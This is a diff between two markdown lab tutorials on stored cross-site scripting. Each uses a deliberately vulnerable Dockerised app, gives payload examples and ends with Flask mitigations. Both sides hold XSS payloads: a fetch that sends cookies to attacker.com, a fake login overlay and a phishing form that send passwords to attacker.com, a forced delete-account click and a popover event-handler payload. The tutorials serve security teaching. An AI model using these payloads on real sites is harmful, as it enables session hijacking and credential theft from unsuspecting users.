@@ -1,225 +1,282 @@
-# Stored XSS into anchor href attribute with double quotes HTML-encoded
+# Stored Cross Site Scripting (XSS)
 
-Cross-Site Scripting (XSS) is a critical security vulnerability in web applications that allows attackers to inject and execute malicious scripts in a user's browser. When the vulnerability exists in anchor (`<a>`) href attributes, it presents unique challenges and attack vectors that developers need to understand.
+Cross-Site Scripting (XSS) is a critical security vulnerability in web applications that allows attackers to inject and execute malicious scripts in a user’s browser. These scripts can compromise sensitive data, hijack user sessions, deface websites, or perform unauthorized actions.
 
 ## **Objective**
 
-- Running the vulnerable `Link Sharing System` in `Docker`.
-- Performing a `Stored XSS` attack by injecting JavaScript into anchor href attributes.
-- Understanding how JavaScript URI schemes can be used to execute malicious code.
-- Identifying ways to detect and mitigate this specific type of XSS vulnerability.
-- Demonstrating security best practices to prevent XSS attacks in href attributes.
+- Running the vulnerable `Application` in `Docker`.
+- Performing a `Stored XSS` attack on the `Application`.
+- Understanding how malicious scripts can be injected and stored on a server.
+- Identifying ways to detect and mitigate stored XSS vulnerabilities.
+- Demonstrating security best practices to prevent XSS attacks in production systems.
 
-## **Understanding Anchor Href Attribute XSS**
+## **What is Cross-Site Scripting (XSS)?**
 
-This specific type of XSS occurs when an application stores user input that is later placed into an anchor (`<a>`) tag's href attribute without proper sanitization. While many applications correctly HTML-encode double quotes (preventing breaking out of the attribute), they often fail to validate the URI scheme, allowing attackers to use `javascript:` URIs to execute arbitrary code.
+XSS is a **web security vulnerability** where attackers inject **malicious scripts** into web pages. These scripts can manipulate the DOM, steal sensitive data, and impersonate users. XSS attacks usually exploit vulnerabilities in input handling and output rendering in web applications.
 
-For example, instead of a normal link like:
-```html
-<a href="https://example.com">Safe Link</a>
-```
+![](./assets/1.svg)
 
-An attacker can inject:
-```html
-<a href="javascript:alert('XSS Attack')">Malicious Link</a>
-```
+## **How Does XSS Work?**
 
-When a user clicks this link, the JavaScript code executes in their browser context.
+### **1. Injection**  
+The attacker injects **malicious input** into a vulnerable part of the web application, such as a form, URL parameter, or comment section. This input is designed to be processed as executable code rather than plain text.
 
-## **Hands-on with Stored XSS in Href Attributes**
+- Example injection in a form field:  
+  ```html
+  <script>alert('XSS Attack');</script>
+  ```
+
+### **2. Execution**  
+The browser executes the injected script when the user accesses the page containing the malicious input. Depending on the type of XSS (Stored, Reflected, or DOM-Based), this could happen automatically (Stored XSS) or require a user to click a malicious link (Reflected XSS).
+
+- Example vulnerable output:  
+  ```html
+  <p>Search results for: <script>alert('XSS Attack');</script></p>
+  ```
+  
+The browser renders and runs the script, displaying an alert box in this example.
+
+### **3. Attack**  
+Once executed, the script can perform harmful actions such as:
+- **Stealing cookies**:  
+  ```javascript
+  fetch('https://attacker.com/steal?cookie=' + document.cookie);
+  ```
+
+  `document.cookie` is used to get the cookies of the user which is stored in the browser.
+
+- **Manipulating the page (DOM)**:  
+  ```javascript
+  document.body.innerHTML = '<h1>This site has been hacked!</h1>';
+  ```
+  `innerHTML` is used to get the innerHTML of the body of the page. When the page is loaded, the script is executed and the innerHTML of the body is changed to `<h1>This site has been hacked!</h1>`.
+
+- **Tricking users with phishing forms**:
+  ```html
+  <form action="https://attacker.com/login" method="POST">
+    <input type="text" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <button type="submit">Log In</button>
+  </form>
+  ```
+
+  The form is submitted to the attacker's server and the username and password are stolen. User is not aware that their credentials are being stolen as the form is submitted to the attacker's server and the user is redirected to the attacker's website.
+  
+  
+  ## **Types of XSS Attacks**
+
+![](./assets/3.svg)
+
+### **1. Stored XSS (Persistent XSS)**  
+In **Stored XSS**, the malicious input is saved on the server, such as in a database. It gets embedded in a web page and automatically executed whenever a user accesses that page. For example, an attacker could post a comment containing a script, which runs whenever someone views the comment.
+
+### **2. Reflected XSS (Non-Persistent XSS)**  
+In **Reflected XSS**, the injected script is not stored on the server. Instead, it is included in the server's response based on user input. The attack usually requires the victim to click a malicious link that contains the script in a query parameter or form submission.
+
+### **3. DOM-Based XSS**  
+In **DOM-Based XSS**, the vulnerability is present in client-side JavaScript code. The application reads untrusted input (e.g., from the URL) and dynamically manipulates the page's content, leading to script execution without any server involvement.
+
+
+## **Stored XSS**
+
+Stored XSS (also known as Persistent XSS) occurs when a malicious script is injected into a website and stored on the target server, such as in a database. The malicious script is then served to other users when they access the affected page. This makes stored XSS particularly dangerous as it can affect multiple users and persists across sessions.
+
+![](./assets/xss.svg)
+
+
+### **How Stored XSS Works**
+
+- Attacker Submits Malicious Script The hacker injects malicious JavaScript code into the website's database through input fields like comments, profile information, or forum posts.
+- Website Stores the Malicious Code The vulnerable application saves the malicious script in its database without proper sanitization or validation.
+- Multiple Users Access the Compromised Page When any user (including administrators) visits the affected page, the stored malicious script is retrieved from the database.
+- Users' Browsers Execute the Script Everyone who loads the affected page automatically executes the malicious script in their browsers, potentially affecting hundreds or thousands of visitors.
+
+### **Impact of Stored XSS**
+
+- **Mass Exploitation:** Unlike reflected XSS, stored attacks can affect all visitors to the compromised page, making them more dangerous and widespread.
+- **Persistent Account Compromise:** Attackers can steal cookies and session tokens from multiple users, leading to widespread account hijacking.
+- **Data Theft:** Sensitive information like personal details, credentials, and payment information can be captured from numerous victims.
+- **Malware Distribution:** Scripts can redirect users to malicious websites or trigger drive-by downloads of malware.
+- **Privilege Escalation:** If an administrative user views the affected page, the attacker might gain access to sensitive administrative functions.
+- **Website Defacement:** The site's content and appearance can be altered for all visitors, damaging the organization's reputation.
+- **Long-Term Persistence:** The attack continues until the malicious script is identified and removed from the database.
+
+## **Hands-on with Reflected XSS**
 
 1. **Pull the Docker Image**
 
    ```bash
-   docker pull yeasin97/stored-lab2:latest
+   docker pull yeasin97/stored-lab1:latest
    ```
 
 2. **Run the Docker Container**
 
    ```bash
-   docker run -d -p 5001:5001 yeasin97/stored-lab2:latest
+   docker run -d -p 5000:5000 yeasin97/stored-lab1:latest
    ```
 3. **Create a Load Balancer in Poridhi's Cloud**
 
-   Find the `eth0` IP address with `ifconfig` command, then create a Load Balancer with that IP address and port `5001`.
+   Find the `eth0` IP address with `ifconfig` command.
 
-   ![](assets/laodb.png)
+   ![](./assets/ifconfig.png)
+
+   Create a Load Balancer with the `eth0 IP` address and the port `5000`
+
+   ![](./assets/loadb.png)
    
 4. **Access the Web Application**
 
-   Access the web application through the URL provided by the load balancer.
+   Access the web application with the the provided `URL` by `loadbalancer`
+
+   ![](./assets/firstv.png)
    
    
+### **Exploring the Application**
+This web app is designed to demonstrate Stored XSS attacks. It allows users to input data, which is permanently stored in the application's database without proper sanitization, making it vulnerable to malicious script injection that affects all users who visit the site.
 
-   ![Initial Application View](assets/home.png)
-   
-### **Exploring the Link Sharing Application**
+When a user adds a comment, it is permanently stored in the database. For example, if a user enters a simple greeting in the comment field, it will be displayed to all visitors who load the page.
 
-This web application allows users to share links by entering a Link Text and URL. 
+Try submitting Poridhi as the name and <>"Hello" as the comment, then click the Submit button.
 
-![Application Interface](./assets/input.png)
+![](./assets/insertc1.png)
 
-Links are stored in the database and displayed to all visitors, making it vulnerable to stored XSS if proper sanitization isn't implemented.
+Notice that the new comment appears on the page, and everyone who visits the page can see it. 
 
-![Application Interface](./assets/output.png)
+![](./assets/readc1.png)
 
-Look at the html source how the previous inputs is stored without any sanitation. So, we can exploit it in different ways. 
+Now, inspect the HTML source code to see how the previous inputs were stored without any sanitization. The inputs were directly inserted between tags, making them exploitable in different ways.
 
-![Application Interface](./assets/inputinspect.png)
+![](./assets/inspect1.png)
 
-### **Exploiting the Vulnerability**
+### **Exploiting the Application**
 
-The application has a vulnerability where it properly HTML-encodes double quotes in href attributes but fails to validate the URI scheme, allowing JavaScript execution.
+Try submitting "Hacker" as the name along with the suggested payload below, then click the Submit button.
 
-To exploit this:
+![](./assets/insertc2.png)
 
-1. Enter a name for your link (e.g., "Click me to XSS attack")
-2. In the URL field, enter: `javascript:alert('Stored XSS Attack Successful!')`
-3. Click the Submit Link button
+As soon as the comment is fetched from the server, the malicious script within the comment gets executed, displaying an alert message.
 
-![Injecting the Payload](./assets/inputxss.png)
+![](./assets/readc2.png)
 
-Now when any user visits the page and clicks on your malicious link, the JavaScript will execute in their browser context:
+Now, inspect the HTML source code and observe how the submitted comment is behaving like a script.
 
-![Successful XSS Attack](./assets/xsssuc.png)
+![](./assets/inspect2.png)
 
-### **Inspecting the Vulnerability**
+As this website is vulnerable you can submit more malicious scripts.
+Try submitting this as comment and observe what happened.
 
-Using browser developer tools, we can see how the malicious code is stored in the anchor tag's href attribute:
-
-![Inspecting the Vulnerability](./assets/inspect.png)
-
-
-You can try other inputs in the link section, for example;
-
-```javascript
-javascript:document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:99999"><h2>Session Expired</h2><form>Username: <input><br>Password: <input type="password" id="p"><br><button type="button" onclick="fetch(\'https://attacker.com/steal?pw=\'+document.getElementById(\'p\').value)">Login</button></form></div>'; void(0)
-
+```html
+<button popovertarget=x>Click me</button><xss ontoggle=alert(1) popover id=x>XSS</xss>
 ```
 
 
-![Fake Login](./assets/social.png)
+You can find more malicious script in this link. Try submitting some from the list.
+
+- [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
 
-```javascript
-javascript:document.body.innerHTML='<h1>Site Hacked</h1>'; void(0)
+## **How to Prevent Stored XSS**
 
-```
+### 1. Input Sanitization
+**Protection Mechanism:** Sanitization removes or neutralizes potentially dangerous content from user input before storage.
 
-![Fake Hacked](./assets/hacked.png)
-
-
-## **Impact of Href Attribute XSS**
-
-This vulnerability allows attackers to:
-
-1. **Execute JavaScript on Click**: Execute arbitrary JavaScript when users click on malicious links
-2. **Session Hijacking**: Steal user cookies and session tokens
-3. **Phishing Attacks**: Redirect users to fake login pages or display convincing fake dialogs
-4. **Data Exfiltration**: Steal sensitive information from the page
-5. **Persistence**: Since the attack is stored in the database, it affects all visitors
-
-## **Advanced Exploitation**
-
-Beyond simple alert boxes, attackers can use more sophisticated payloads:
-
-```javascript
-javascript:fetch('https://attacker.com/steal?cookie='+document.cookie);
-```
-
-Or trigger actions without user awareness:
-
-```javascript
-javascript:document.getElementById('delete-account').click();void(0);
-```
-
-
-## **How to Prevent Stored XSS in Href Attributes**
-
-### 1. URL Scheme Validation
-
-**Protection Mechanism:** Restrict allowed URL schemes to safe protocols.
-
-**How it protects:** By only allowing safe schemes like `http://`, `https://`, `mailto:`, etc., you prevent the use of dangerous schemes like `javascript:`.
+**How it protects:** By stripping or encoding HTML tags and special characters, sanitization prevents attackers from injecting executable code that could be stored and later executed in users' browsers.
 
 **Implementation (Python with Flask):**
 ```python
-import re
+from markupsafe import escape
 
-def is_safe_url(url):
-    # Only allow http, https, mailto, tel schemes
-    safe_schemes = re.compile(r'^(https?|mailto|tel):', re.IGNORECASE)
-    return bool(safe_schemes.match(url))
+@app.route('/add_comment', methods=['POST'])
+def add_comment():
+    username = escape(request.form.get('username'))
+    content = escape(request.form.get('content'))
+    # Store sanitized input
+    comment = Comment(username=username, content=content)
+    db.session.add(comment)
+    db.session.commit()
+```
+   **Alternative using Bleach library:**
+   ```python
+   import bleach
+   
+   @app.route('/add_comment', methods=['POST'])
+   def add_comment():
+       username = bleach.clean(request.form.get('username'))
+       content = bleach.clean(request.form.get('content'), 
+                            tags=['p', 'b', 'i'], 
+                            strip=True)
+       # Store sanitized input
+   ```
 
-@app.route('/add_link', methods=['POST'])
-def add_link():
-    link_text = request.form.get('link_text')
-    url = request.form.get('url')
-    
-    if not is_safe_url(url):
-        return "Invalid URL scheme", 400
-        
-    # Store the link safely...
+### 2. Output Encoding
+**Protection Mechanism:** Output encoding converts characters into their HTML entity equivalents.
+
+**How it protects:** Even if malicious content somehow makes it into your database, encoding ensures that when the content is displayed, browsers interpret it as text rather than executable code.
+
+**Implementation (Flask with Jinja2):**
+```html
+<!-- Auto-escaping is enabled by default in Flask's Jinja2 templates -->
+<div class="comment">
+    <h3>{{ comment.username }}</h3>
+    <p>{{ comment.content }}</p>
+</div>
 ```
 
-### 2. Content Security Policy (CSP)
+### 3. Content Security Policy (CSP)
+**Protection Mechanism:** CSP is an HTTP header that tells browsers which dynamic resources are allowed to load.
 
-**Protection Mechanism:** Implement a strict CSP that blocks inline JavaScript execution.
+**How it protects:** CSP provides a defense-in-depth approach by restricting which scripts can execute, even if an XSS vulnerability exists. It acts as a safety net by preventing script execution from unauthorized sources.
 
 **Implementation (Python with Flask):**
 ```python
 @app.after_request
 def add_security_headers(response):
-    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';"
+    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'self'; object-src 'none';"
     return response
 ```
 
-### 3. URL Encoding Functions
+### 4. Input Validation
+**Protection Mechanism:** Input validation ensures that user input conforms to expected formats and values.
 
-**Protection Mechanism:** Use libraries that handle URL validation robustly.
+**How it protects:** By rejecting suspicious or malformed input that doesn't match expected patterns, validation prevents potentially harmful data from entering your application in the first place.
 
 **Implementation (Python):**
 ```python
-from urllib.parse import urlparse
-
-def validate_url(url):
-    parsed = urlparse(url)
-    if parsed.scheme not in ('http', 'https', 'mailto'):
+def validate_comment(username, content):
+    if not username or not content:
+        return False
+    if len(username) > 50 or len(content) > 1000:
         return False
     return True
+    
+# Usage in route
+if not validate_comment(username, content):
+    return "Invalid input", 400
 ```
 
-### 4. HTML Purification Libraries
+### 5. HTTP-Only Cookies
+**Protection Mechanism:** HTTP-Only flag prevents JavaScript from accessing cookies.
 
-**Protection Mechanism:** Use libraries specifically designed to sanitize HTML and URLs.
+**How it protects:** Even if an XSS vulnerability exists, attackers cannot easily steal session cookies through client-side scripts, preventing session hijacking attacks.
 
-**Implementation (Python with BeautifulSoup and bleach):**
+**Implementation (Python with Flask):**
 ```python
-import bleach
-
-@app.route('/add_link', methods=['POST'])
-def add_link():
-    link_text = request.form.get('link_text')
-    url = request.form.get('url')
-    
-    # Sanitize URL
-    url = bleach.clean(url)
-    
-    # Additional URL scheme validation
-    if not is_safe_url(url):
-        return "Invalid URL", 400
-        
-    # Store sanitized data
+app.config['SESSION_COOKIE_HTTPONLY'] = True
+app.config['REMEMBER_COOKIE_HTTPONLY'] = True
 ```
 
-## **Best Practices for Production**
 
-1. **Defense in Depth**: Implement multiple layers of protection
-2. **Safe by Default**: Always validate input and sanitize output
-3. **Principle of Least Privilege**: Minimize what users can do to reduce attack surface
-4. **Regular Testing**: Use automated tools and manual penetration testing
-5. **Stay Updated**: Keep libraries and frameworks updated to benefit from security patches
+### 6. X-XSS-Protection Header
+**Protection Mechanism:** Enables browser's built-in XSS filters.
+
+**How it protects:** Modern browsers have built-in XSS detection capabilities that can be activated with this header, providing an additional layer of defense.
+
+```python
+@app.after_request
+def add_security_headers(response):
+    response.headers['X-XSS-Protection'] = '1; mode=block'
+    return response
+```
 
 ## **Conclusion**
-
-Stored XSS vulnerabilities in anchor href attributes present unique challenges because they can bypass traditional HTML encoding defenses. By understanding the attack vector and implementing proper URL scheme validation, developers can effectively prevent these attacks in their web applications. Remember that XSS prevention requires a multi-faceted approach that includes input validation, output encoding, and appropriate content security policies.
+In this lab, we have learned about Stored XSS attacks and their impact on web applications. We explored how malicious scripts can be injected and stored on a server, affecting all users who visit the vulnerable page. By implementing proper input sanitization, output encoding, Content Security Policies, and input validation, we can effectively prevent Stored XSS vulnerabilities in our web applications. These security measures are essential for protecting user data and maintaining the integrity of web services in production environments.
